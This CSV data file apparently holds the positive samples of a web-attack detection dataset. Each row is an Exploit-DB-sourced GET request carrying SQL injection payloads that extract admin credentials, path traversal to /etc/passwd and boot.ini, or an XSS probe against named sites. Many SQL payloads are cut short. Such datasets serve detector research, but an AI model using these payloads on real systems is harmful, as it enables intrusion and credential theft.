"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_001929","1","exploitdb","https://www.exploit-db.com/exploits/6034","GET","http://www.dreamlevels.com/demo/photosite/?page=-2+union+select+null,null,null,null,concat_ws","/demo/photosite/","page=-2+union+select+null,null,null,null,concat_ws","[]","","http://www.dreamlevels.com/demo/photosite/?page=-2+union+select+null,null,null,null,concat_ws","sqli"
"pos_luongvd_001930","1","exploitdb","https://www.exploit-db.com/exploits/6010","GET","http://demo.xpoze.org/user.html?uid=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,concat","/user.html","uid=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,concat","[]","","http://demo.xpoze.org/user.html?uid=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,concat","sqli"
"pos_luongvd_001931","1","exploitdb","https://www.exploit-db.com/exploits/5991","GET","http://site.com/path/newThread.php?boardID=+999999%20union%20select%20email,concat_ws","/path/newThread.php","boardID=+999999%20union%20select%20email,concat_ws","[]","","http://site.com/path/newThread.php?boardID=+999999%20union%20select%20email,concat_ws","sqli"
"pos_luongvd_001932","1","exploitdb","https://www.exploit-db.com/exploits/5988","GET","http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+login+from+br_admins--","/demos/plxadtrader/ad.php","s=redir&f=siteurl&adid=-12+UNION+SELECT+login+from+br_admins--","[]","","http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+login+from+br_admins--","sqli"
"pos_luongvd_001933","1","exploitdb","https://www.exploit-db.com/exploits/5988","GET","http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+pass+from+br_admins--","/demos/plxadtrader/ad.php","s=redir&f=siteurl&adid=-12+UNION+SELECT+pass+from+br_admins--","[]","","http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+pass+from+br_admins--","sqli"
"pos_luongvd_001934","1","exploitdb","https://www.exploit-db.com/exploits/5987","GET","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+ayarlar","/demo/shop/","cmd=urunler&cat_id=30+union+select+0+from+ayarlar","[]","","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+ayarlar","sqli"
"pos_luongvd_001935","1","exploitdb","https://www.exploit-db.com/exploits/5987","GET","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+eng","/demo/shop/","cmd=urunler&cat_id=30+union+select+0+from+eng","[]","","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+eng","sqli"
"pos_luongvd_001936","1","exploitdb","https://www.exploit-db.com/exploits/5987","GET","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+tr","/demo/shop/","cmd=urunler&cat_id=30+union+select+0+from+tr","[]","","http://www.efestech.com/demo/shop/?cmd=urunler&cat_id=30+union+select+0+from+tr","sqli"
"pos_luongvd_001937","1","exploitdb","https://www.exploit-db.com/exploits/5964","GET","http://www.site.com/obmp22/checkavail.php?ln=en&id=-1+union+select+concat_ws","/obmp22/checkavail.php","ln=en&id=-1+union+select+concat_ws","[]","","http://www.site.com/obmp22/checkavail.php?ln=en&id=-1+union+select+concat_ws","sqli"
"pos_luongvd_001938","1","exploitdb","https://www.exploit-db.com/exploits/5964","GET","http://demo.onlinebookingmanager.com/adminside/hotel/obm2.2/checkavail.php?ln=en&id=-1+union+select+concat_ws","/adminside/hotel/obm2.2/checkavail.php","ln=en&id=-1+union+select+concat_ws","[]","","http://demo.onlinebookingmanager.com/adminside/hotel/obm2.2/checkavail.php?ln=en&id=-1+union+select+concat_ws","sqli"
"pos_luongvd_001939","1","exploitdb","https://www.exploit-db.com/exploits/5960","GET","http://demo.seportal.org/poll.php?poll_id=1'+union+select+1,convert","/poll.php","poll_id=1'+union+select+1,convert","[]","","http://demo.seportal.org/poll.php?poll_id=1'+union+select+1,convert","sqli"
"pos_luongvd_001940","1","exploitdb","https://www.exploit-db.com/exploits/5957","GET","http://192.168.24.25/otmanager/index.php?conteudo=../../../../../../../../boot.ini%00","/otmanager/index.php","conteudo=../../../../../../../../boot.ini%00","[]","","http://192.168.24.25/otmanager/index.php?conteudo=../../../../../../../../boot.ini%00","lfi"
"pos_luongvd_001941","1","exploitdb","https://www.exploit-db.com/exploits/5941","GET","http://192.168.24.25/polypager/?Test&nr=-999/**/UNION/**/SELECT/**/1,2,3,4,admin_name,admin_pass,7,8,9,10/**/FROM/**/_sys_sys--","/polypager/","Test&nr=-999/**/UNION/**/SELECT/**/1,2,3,4,admin_name,admin_pass,7,8,9,10/**/FROM/**/_sys_sys--","[]","","http://192.168.24.25/polypager/?Test&nr=-999/**/UNION/**/SELECT/**/1,2,3,4,admin_name,admin_pass,7,8,9,10/**/FROM/**/_sys_sys--","sqli"
"pos_luongvd_001942","1","exploitdb","https://www.exploit-db.com/exploits/5934","GET","http://www.site.org/Script/index.php?sbjoke_id=-1+union+select+0,1,2,3,concat_ws","/Script/index.php","sbjoke_id=-1+union+select+0,1,2,3,concat_ws","[]","","http://www.site.org/Script/index.php?sbjoke_id=-1+union+select+0,1,2,3,concat_ws","sqli"
"pos_luongvd_001943","1","exploitdb","https://www.exploit-db.com/exploits/5940","GET","http://192.168.24.25/kwa/Public/index.php?action=../../../../../../../../boot.ini%00","/kwa/Public/index.php","action=../../../../../../../../boot.ini%00","[]","","http://192.168.24.25/kwa/Public/index.php?action=../../../../../../../../boot.ini%00","lfi"
"pos_luongvd_001944","1","exploitdb","https://www.exploit-db.com/exploits/5929","GET","http://www.site.com/Script/adclick.php?bannerid=-1+union+select+concat_ws","/Script/adclick.php","bannerid=-1+union+select+concat_ws","[]","","http://www.site.com/Script/adclick.php?bannerid=-1+union+select+concat_ws","sqli"
"pos_luongvd_001945","1","exploitdb","https://www.exploit-db.com/exploits/5930","GET","http://www.site.org/Script/out.php?linkid=-1+union+select+1,2,3,concat_ws","/Script/out.php","linkid=-1+union+select+1,2,3,concat_ws","[]","","http://www.site.org/Script/out.php?linkid=-1+union+select+1,2,3,concat_ws","sqli"
"pos_luongvd_001946","1","exploitdb","https://www.exploit-db.com/exploits/5930","GET","http://e-topbiz.com/trafficdemos/linkads1/out.php?linkid=-1+union+select+1,2,3,concat_ws","/trafficdemos/linkads1/out.php","linkid=-1+union+select+1,2,3,concat_ws","[]","","http://e-topbiz.com/trafficdemos/linkads1/out.php?linkid=-1+union+select+1,2,3,concat_ws","sqli"
"pos_luongvd_001947","1","exploitdb","https://www.exploit-db.com/exploits/5928","GET","http://www.hivemaker.com/demo/sites/index.php?cid=-1+UNION+SELECT+1,2,3,concat_ws","/demo/sites/index.php","cid=-1+UNION+SELECT+1,2,3,concat_ws","[]","","http://www.hivemaker.com/demo/sites/index.php?cid=-1+UNION+SELECT+1,2,3,concat_ws","sqli"
"pos_luongvd_001948","1","exploitdb","https://www.exploit-db.com/exploits/5911","GET","http://site.com/guide/guide.php?id=-1+UNION+SELECT+1,2,concat_ws","/guide/guide.php","id=-1+UNION+SELECT+1,2,concat_ws","[]","","http://site.com/guide/guide.php?id=-1+UNION+SELECT+1,2,concat_ws","sqli"
"pos_luongvd_001949","1","exploitdb","https://www.exploit-db.com/exploits/5910","GET","http://demo.skylinewebnapps.com/Ready2Edit/pages.php?menuid=-1+union+select+1,concat_ws","/Ready2Edit/pages.php","menuid=-1+union+select+1,concat_ws","[]","","http://demo.skylinewebnapps.com/Ready2Edit/pages.php?menuid=-1+union+select+1,concat_ws","sqli"
"pos_luongvd_001950","1","exploitdb","https://www.exploit-db.com/exploits/5912","GET","http://www.site.xx/index.asp?newsid=927+union+select+1,password,3,4,userid,6,7+from+users","/index.asp","newsid=927+union+select+1,password,3,4,userid,6,7+from+users","[]","","http://www.site.xx/index.asp?newsid=927+union+select+1,password,3,4,userid,6,7+from+users","sqli"
"pos_luongvd_001951","1","exploitdb","https://www.exploit-db.com/exploits/5892","GET","http://www.phpauction.net/phpauction-gpl-3.2/item.php?id=-1+%75%6E%69%6F%6E+select+1,2,concat_ws","/phpauction-gpl-3.2/item.php","id=-1+%75%6E%69%6F%6E+select+1,2,concat_ws","[]","","http://www.phpauction.net/phpauction-gpl-3.2/item.php?id=-1+%75%6E%69%6F%6E+select+1,2,concat_ws","sqli"
"pos_luongvd_001952","1","exploitdb","https://www.exploit-db.com/exploits/5884","GET","http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt","/index.php","page=../../../../../../../xampp/xampp-changes.txt","[]","","http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt","lfi"
"pos_luongvd_001953","1","exploitdb","https://www.exploit-db.com/exploits/5884","GET","http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt%00","/index.php","page=../../../../../../../xampp/xampp-changes.txt%00","[]","","http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt%00","lfi"
"pos_luongvd_001954","1","exploitdb","https://www.exploit-db.com/exploits/5890","GET","http://www.ajhyip.com/demo/acme/news.php?id=-1+union+select+null,null,concat_ws","/demo/acme/news.php","id=-1+union+select+null,null,concat_ws","[]","","http://www.ajhyip.com/demo/acme/news.php?id=-1+union+select+null,null,concat_ws","sqli"
"pos_luongvd_001955","1","exploitdb","https://www.exploit-db.com/exploits/5879","GET","http://phpauctions.info/phpauction/demo/profile.php?user_id=1&auction_id=-2+union+select+concat_ws","/phpauction/demo/profile.php","user_id=1&auction_id=-2+union+select+concat_ws","[]","","http://phpauctions.info/phpauction/demo/profile.php?user_id=1&auction_id=-2+union+select+concat_ws","sqli"
"pos_luongvd_001956","1","exploitdb","https://www.exploit-db.com/exploits/5883","GET","http://www.kblance.com/demo/index.php?main=comment&sub=index&view=&qid=3&cat_id=-3+union+select+1,concat_ws","/demo/index.php","main=comment&sub=index&view=&qid=3&cat_id=-3+union+select+1,concat_ws","[]","","http://www.kblance.com/demo/index.php?main=comment&sub=index&view=&qid=3&cat_id=-3+union+select+1,concat_ws","sqli"
"pos_luongvd_001957","1","exploitdb","https://www.exploit-db.com/exploits/5875","GET","http://www.cistyle.de/demo/links-extern.php?id=-2+union+select+1,concat_ws","/demo/links-extern.php","id=-2+union+select+1,concat_ws","[]","","http://www.cistyle.de/demo/links-extern.php?id=-2+union+select+1,concat_ws","sqli"
"pos_luongvd_001958","1","exploitdb","https://www.exploit-db.com/exploits/5878","GET","http://www.emusoft.org/index.php?page=category&cat_id=-9999+union+all+select+1,concat","/index.php","page=category&cat_id=-9999+union+all+select+1,concat","[]","","http://www.emusoft.org/index.php?page=category&cat_id=-9999+union+all+select+1,concat","sqli"
"pos_luongvd_001959","1","exploitdb","https://www.exploit-db.com/exploits/5877","GET","http://192.168.24.25/jubb/viewprofile.php?user=../../../../../../../../boot.ini%00","/jubb/viewprofile.php","user=../../../../../../../../boot.ini%00","[]","","http://192.168.24.25/jubb/viewprofile.php?user=../../../../../../../../boot.ini%00","lfi"
"pos_luongvd_001960","1","exploitdb","https://www.exploit-db.com/exploits/5863","GET","http://site.com/index.php?lang=en&menuclick=-1+UNION+SELECT+concat_ws","/index.php","lang=en&menuclick=-1+UNION+SELECT+concat_ws","[]","","http://site.com/index.php?lang=en&menuclick=-1+UNION+SELECT+concat_ws","sqli"
"pos_luongvd_001961","1","exploitdb","https://www.exploit-db.com/exploits/5862","GET","http://site.com/site.php?contentsid=-1+UNION%20SELECT+1,2,4,3,concat_ws","/site.php","contentsid=-1+UNION%20SELECT+1,2,4,3,concat_ws","[]","","http://site.com/site.php?contentsid=-1+UNION%20SELECT+1,2,4,3,concat_ws","sqli"
"pos_luongvd_001962","1","exploitdb","https://www.exploit-db.com/exploits/5854","GET","http://www.mybizz-classifieds.com/mybizz/index.php?cat=-1+union+select+user","/mybizz/index.php","cat=-1+union+select+user","[]","","http://www.mybizz-classifieds.com/mybizz/index.php?cat=-1+union+select+user","sqli"
"pos_luongvd_001963","1","exploitdb","https://www.exploit-db.com/exploits/5855","GET","http://www.webstorexpert.com/demo/index.php?cat_path=-1+union+select+concat","/demo/index.php","cat_path=-1+union+select+concat","[]","","http://www.webstorexpert.com/demo/index.php?cat_path=-1+union+select+concat","sqli"
"pos_luongvd_001964","1","exploitdb","https://www.exploit-db.com/exploits/5852","GET","http://swtdemo.com/cms/php/showNews.php?newsid=-10+union+select+1,concat_ws","/cms/php/showNews.php","newsid=-10+union+select+1,concat_ws","[]","","http://swtdemo.com/cms/php/showNews.php?newsid=-10+union+select+1,concat_ws","sqli"
"pos_luongvd_001965","1","exploitdb","https://www.exploit-db.com/exploits/5846","GET","http://demo.erocms.de/index.php?site=-1'+union+select+1,2,concat_ws","/index.php","site=-1'+union+select+1,2,concat_ws","[]","","http://demo.erocms.de/index.php?site=-1'+union+select+1,2,concat_ws","sqli"
"pos_luongvd_001966","1","exploitdb","https://www.exploit-db.com/exploits/5848","GET","http://192.168.24.25/traindepot/index.php?module=../../../../../../../../boot.ini%00","/traindepot/index.php","module=../../../../../../../../boot.ini%00","[]","","http://192.168.24.25/traindepot/index.php?module=../../../../../../../../boot.ini%00","lfi"
"pos_luongvd_001967","1","exploitdb","https://www.exploit-db.com/exploits/5853","GET","http://softdivision.com/maxtradedemo/modules.php?module=trade&function=pocategorisell&cat=0&stranica=menu&categori=-1+union+select+current_user,2/*","/maxtradedemo/modules.php","module=trade&function=pocategorisell&cat=0&stranica=menu&categori=-1+union+select+current_user,2/*","[]","","http://softdivision.com/maxtradedemo/modules.php?module=trade&function=pocategorisell&cat=0&stranica=menu&categori=-1+union+select+current_user,2/*","sqli"
"pos_luongvd_001968","1","exploitdb","https://www.exploit-db.com/exploits/5838","GET","http://demo.freecms.us/index.php?page=-28+union+select+concat_ws","/index.php","page=-28+union+select+concat_ws","[]","","http://demo.freecms.us/index.php?page=-28+union+select+concat_ws","sqli"
"pos_luongvd_001969","1","exploitdb","https://www.exploit-db.com/exploits/5842","GET","http://www.kalptarudemos.com/demo/phpsitelock/index.php?page=show_article&articleid=-1+union+select+concat_ws","/demo/phpsitelock/index.php","page=show_article&articleid=-1+union+select+concat_ws","[]","","http://www.kalptarudemos.com/demo/phpsitelock/index.php?page=show_article&articleid=-1+union+select+concat_ws","sqli"
"pos_luongvd_001970","1","exploitdb","https://www.exploit-db.com/exploits/5836","GET","http://demo.basic-cms.de/pages/index.php?r=&page_id=-74+union+select+1,1,1,convert","/pages/index.php","r=&page_id=-74+union+select+1,1,1,convert","[]","","http://demo.basic-cms.de/pages/index.php?r=&page_id=-74+union+select+1,1,1,convert","sqli"
"pos_luongvd_001971","1","exploitdb","https://www.exploit-db.com/exploits/5835","GET","http://www.bizon-soft.com/bizon-cms-demo/photo/index.php?Page=ShowPicture&Id=-756+union+select+1,2,3,4,5,6,@@version,current_user,database","/bizon-cms-demo/photo/index.php","Page=ShowPicture&Id=-756+union+select+1,2,3,4,5,6,@@version,current_user,database","[]","","http://www.bizon-soft.com/bizon-cms-demo/photo/index.php?Page=ShowPicture&Id=-756+union+select+1,2,3,4,5,6,@@version,current_user,database","sqli"
"pos_luongvd_001972","1","exploitdb","https://www.exploit-db.com/exploits/5830","GET","http://demo.nitropowered.de/albums.php?section=cats&action=show&CatId=-1+union+select+1,concat_ws","/albums.php","section=cats&action=show&CatId=-1+union+select+1,concat_ws","[]","","http://demo.nitropowered.de/albums.php?section=cats&action=show&CatId=-1+union+select+1,concat_ws","sqli"
"pos_luongvd_001973","1","exploitdb","https://www.exploit-db.com/exploits/5813","GET","http://192.168.24.25/wallcity/index.php?page=../../../../../../etc/passwd%00","/wallcity/index.php","page=../../../../../../etc/passwd%00","[]","","http://192.168.24.25/wallcity/index.php?page=../../../../../../etc/passwd%00","lfi"
"pos_luongvd_001974","1","exploitdb","https://www.exploit-db.com/exploits/5785","GET","http://efiction.hugosnebula.com/preview/toplists.php?list=1'+and+1=0+union+select+1,2,current_user,4,5,6,7,8/*","/preview/toplists.php","list=1'+and+1=0+union+select+1,2,current_user,4,5,6,7,8/*","[]","","http://efiction.hugosnebula.com/preview/toplists.php?list=1'+and+1=0+union+select+1,2,current_user,4,5,6,7,8/*","sqli"
"pos_luongvd_001975","1","exploitdb","https://www.exploit-db.com/exploits/5754","GET","http://192.168.1.103:80/phpinv/search.php?hash=19e9abf204087d0765f81c5bfb1a6fef&keyword=>""><script>alert(123);</script>&categoryid=1&action=Search","/phpinv/search.php","hash=19e9abf204087d0765f81c5bfb1a6fef&keyword=>""><script>alert(123);</script>&categoryid=1&action=Search","[[""Accept"", ""*/*""], [""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)""], [""Host"", ""192.168.1.103""], [""Connection"", ""Close""], [""Pragma"", ""no-cache""]]","
##################################################################
# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
##################################################################

# milw0rm.com [2008-06-08]","GET http://192.168.1.103:80/phpinv/search.php?hash=19e9abf204087d0765f81c5bfb1a6fef&keyword=>""><script>alert(123);</script>&categoryid=1&action=Search HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
Host: 192.168.1.103
Connection: Close
Pragma: no-cache


##################################################################
# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
##################################################################

# milw0rm.com [2008-06-08]","xss"
"pos_luongvd_001976","1","exploitdb","https://www.exploit-db.com/exploits/5754","GET","http://192.168.1.103:80/phpinv/entry.php?hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../phpinfo","/phpinv/entry.php","hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../phpinfo","[]","","http://192.168.1.103:80/phpinv/entry.php?hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../phpinfo","lfi"
"pos_luongvd_001977","1","exploitdb","https://www.exploit-db.com/exploits/5754","GET","http://192.168.1.103:80/phpinv/entry.php?hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../etc/passwd%00","/phpinv/entry.php","hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../etc/passwd%00","[]","","http://192.168.1.103:80/phpinv/entry.php?hash=19e9abf204087d0765f81c5bfb1a6fef&categoryid=1&orderby=10&action=/../../../../../etc/passwd%00","lfi"
"pos_luongvd_001978","1","exploitdb","https://www.exploit-db.com/exploits/5744","GET","http://site/edCss.php?css_str=-1%20union%20select%20null,null,id,username,pw,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20pphl_users%20limit%200,1&action=edit","/edCss.php","css_str=-1%20union%20select%20null,null,id,username,pw,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20pphl_users%20limit%200,1&action=edit","[]","","http://site/edCss.php?css_str=-1%20union%20select%20null,null,id,username,pw,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20pphl_users%20limit%200,1&action=edit","sqli"
"pos_luongvd_001979","1","exploitdb","https://www.exploit-db.com/exploits/5717","GET","http://localsite.com/path/index.asp?item=-50+union+select+0,adminid,pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+settings","/path/index.asp","item=-50+union+select+0,adminid,pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+settings","[]","","http://localsite.com/path/index.asp?item=-50+union+select+0,adminid,pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+settings","sqli"
"pos_luongvd_001980","1","exploitdb","https://www.exploit-db.com/exploits/5704","GET","http://w3.funsrv.com/~konjo/passwiki/passwiki.php?site_id=../../../../../../../../../../../../../etc/passwd%00","/~konjo/passwiki/passwiki.php","site_id=../../../../../../../../../../../../../etc/passwd%00","[]","","http://w3.funsrv.com/~konjo/passwiki/passwiki.php?site_id=../../../../../../../../../../../../../etc/passwd%00","lfi"
"pos_luongvd_001981","1","exploitdb","https://www.exploit-db.com/exploits/5704","GET","http://inajob.no-ip.org/passwiki/passwiki.php?site_id=../../../../../../../../../../../../../etc/passwd%00","/passwiki/passwiki.php","site_id=../../../../../../../../../../../../../etc/passwd%00","[]","","http://inajob.no-ip.org/passwiki/passwiki.php?site_id=../../../../../../../../../../../../../etc/passwd%00","lfi"
"pos_luongvd_001982","1","exploitdb","https://www.exploit-db.com/exploits/5680","GET","http://kmrg.itb.ac.id/otomigenx/library_rss.php?lang=../../../../../etc/passwd","/otomigenx/library_rss.php","lang=../../../../../etc/passwd","[]","","http://kmrg.itb.ac.id/otomigenx/library_rss.php?lang=../../../../../etc/passwd","lfi"
"pos_luongvd_001983","1","exploitdb","https://www.exploit-db.com/exploits/5676","GET","http://server.com/path/index.php?name=webboard&category=1+and+1=2+union+select+concat","/path/index.php","name=webboard&category=1+and+1=2+union+select+concat","[]","","http://server.com/path/index.php?name=webboard&category=1+and+1=2+union+select+concat","sqli"
"pos_luongvd_001984","1","exploitdb","https://www.exploit-db.com/exploits/5663","GET","http://www.xxx.com/news.php?newsid=79+union+select+1,pwd,3,4+from/**/sm3na_authors--","/news.php","newsid=79+union+select+1,pwd,3,4+from/**/sm3na_authors--","[]","","http://www.xxx.com/news.php?newsid=79+union+select+1,pwd,3,4+from/**/sm3na_authors--","sqli"
"pos_luongvd_001985","1","exploitdb","https://www.exploit-db.com/exploits/5663","GET","http://www.xxx.com/news.php?newsid=79+union+select+1,aid,3,4+from/**/sm3na_authors--","/news.php","newsid=79+union+select+1,aid,3,4+from/**/sm3na_authors--","[]","","http://www.xxx.com/news.php?newsid=79+union+select+1,aid,3,4+from/**/sm3na_authors--","sqli"
"pos_luongvd_001986","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik1/netbutik.php?cat=-1+union+select+concat_ws","/netbutik1/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.target.dk/netbutik1/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001987","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik1/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik1_brugere/*","/netbutik1/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik1_brugere/*","[]","","http://www.target.dk/netbutik1/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik1_brugere/*","sqli"
"pos_luongvd_001988","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik2/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","/netbutik2/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","[]","","http://www.target.dk/netbutik2/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","sqli"
"pos_luongvd_001989","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik2/netbutik.php?cat=-1+union+select+concat_ws","/netbutik2/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.target.dk/netbutik2/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001990","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik3/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","/netbutik3/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","[]","","http://www.target.dk/netbutik3/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","sqli"
"pos_luongvd_001991","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik3/netbutik.php?cat=-1+union+select+concat_ws","/netbutik3/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.target.dk/netbutik3/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001992","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik4/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik4_brugere/*","/netbutik4/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik4_brugere/*","[]","","http://www.target.dk/netbutik4/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik4_brugere/*","sqli"
"pos_luongvd_001993","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.target.dk/netbutik4/netbutik.php?cat=-1+union+select+concat_ws","/netbutik4/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.target.dk/netbutik4/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001994","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.simpelside.dk/netbutik1/netbutik.php?cat=-1+union+select+concat_ws","/netbutik1/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.simpelside.dk/netbutik1/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001995","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.simpelside.dk/netbutik2/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","/netbutik2/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","[]","","http://www.simpelside.dk/netbutik2/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik2_brugere/*","sqli"
"pos_luongvd_001996","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.simpelside.dk/netbutik3/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","/netbutik3/product.php","id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","[]","","http://www.simpelside.dk/netbutik3/product.php?id=-1+union+select+1,2,brugernavn,adgangskode,5,6,7,8,9+from+netbutik3_brugere/*","sqli"
"pos_luongvd_001997","1","exploitdb","https://www.exploit-db.com/exploits/5665","GET","http://www.simpelside.dk/netbutik4/netbutik.php?cat=-1+union+select+concat_ws","/netbutik4/netbutik.php","cat=-1+union+select+concat_ws","[]","","http://www.simpelside.dk/netbutik4/netbutik.php?cat=-1+union+select+concat_ws","sqli"
"pos_luongvd_001998","1","exploitdb","https://www.exploit-db.com/exploits/5664","GET","http://www.simpelside.dk/web1/index2.php?id=-4+union+select+1,2,concat_ws","/web1/index2.php","id=-4+union+select+1,2,concat_ws","[]","","http://www.simpelside.dk/web1/index2.php?id=-4+union+select+1,2,concat_ws","sqli"
"pos_luongvd_001999","1","exploitdb","https://www.exploit-db.com/exploits/5664","GET","http://www.simpelside.dk/web2/index2.php?id=2&mainid=-1+union+select+1,concat_ws","/web2/index2.php","id=2&mainid=-1+union+select+1,concat_ws","[]","","http://www.simpelside.dk/web2/index2.php?id=2&mainid=-1+union+select+1,concat_ws","sqli"
